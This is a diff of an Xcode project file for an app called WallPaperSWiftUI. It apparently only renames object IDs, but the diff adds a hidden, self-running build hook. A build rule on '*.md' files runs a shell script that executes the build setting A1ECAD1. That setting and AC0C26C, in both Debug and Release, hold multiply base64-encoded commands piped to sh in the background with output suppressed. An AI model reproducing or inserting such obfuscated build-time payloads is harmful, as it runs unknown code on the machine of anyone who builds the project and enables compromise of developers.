@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		0A86413CEBDD4453A11DACE1 /* README.md */ = {isa = PBXBuildFile; fileRef = 1C521EF4CFCC4800811DACE1; };
+		9113AE85A5014B7FBF1DACE1 /* README.md */ = {isa = PBXBuildFile; fileRef = FE3BBACD2E9149728C1DACE1; };
 		BD695B682F50503000C2CB9D /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = BD695B672F50503000C2CB9D /* Alamofire */; };
 		BD695B822F50537500C2CB9D /* WindowSceneReader in Frameworks */ = {isa = PBXBuildFile; productRef = BD695B812F50537500C2CB9D /* WindowSceneReader */; };
 		BD6E1D4B2F72719E00CB5EEC /* CropViewController in Frameworks */ = {isa = PBXBuildFile; productRef = BD6E1D4A2F72719E00CB5EEC /* CropViewController */; };
@@ -20,7 +20,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		1C521EF4CFCC4800811DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		FE3BBACD2E9149728C1DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		BD06D9EC2F5020E4007F8736 /* WallPaperSWiftUI.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = WallPaperSWiftUI.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -76,7 +76,7 @@
 		BD06D9ED2F5020E4007F8736 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				1C521EF4CFCC4800811DACE1 /* README.md */,
+				FE3BBACD2E9149728C1DACE1 /* README.md */,
 				BD06D9EC2F5020E4007F8736 /* WallPaperSWiftUI.app */,
 			);
 			name = Products;
@@ -94,7 +94,7 @@
 				BD06D9EA2F5020E4007F8736 /* Resources */,
 			);
 			buildRules = (
-				9AE80F901F4E4F91951DACE1 /* PBXBuildRule */,
+				1971DEEA0DEC4998BF1DACE1 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -177,7 +177,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		9AE80F901F4E4F91951DACE1 /* PBXBuildRule */ = {
+		1971DEEA0DEC4998BF1DACE1 /* PBXBuildRule */ = {
 				isa = PBXBuildRule;
 				compilerSpec = com.apple.compilers.proxy.script;
 				filePatterns = "*.md";
@@ -191,14 +191,14 @@
 				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
 sh -c \"${A1ECAD1}\"";
 			};
-				/* End PBXBuildRule section */
+					/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		BD06D9EA2F5020E4007F8736 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				0A86413CEBDD4453A11DACE1 /* README.md */,
+				9113AE85A5014B7FBF1DACE1 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -221,7 +221,7 @@ sh -c \"${A1ECAD1}\"";
 		BD06D9F52F5020E5007F8736 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((q(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxSWFIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5hMnhFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGFHRlRSVFV3V1dwT1MySkhSbGhPU0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | q | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((h(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLYWsxSWFIUlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5WV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGFHRlRSVFZ4V1ZWa1YyRnRSWHBVV0ZacVlteFdNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | h | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((p(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKVVIxcDZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpORWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XMWtWelZxWVVkR01HTjVOWGxrVXpsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | p | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
@@ -289,7 +289,7 @@ sh -c \"${A1ECAD1}\"";
 		BD06D9F62F5020E5007F8736 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((q(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxSWFIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5hMnhFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGFHRlRSVFV3V1dwT1MySkhSbGhPU0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | q | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((h(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLYWsxSWFIUlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5WV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGFHRlRSVFZ4V1ZWa1YyRnRSWHBVV0ZacVlteFdNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | h | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((p(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKVVIxcDZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpORWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XMWtWelZxWVVkR01HTjVOWGxrVXpsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | p | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
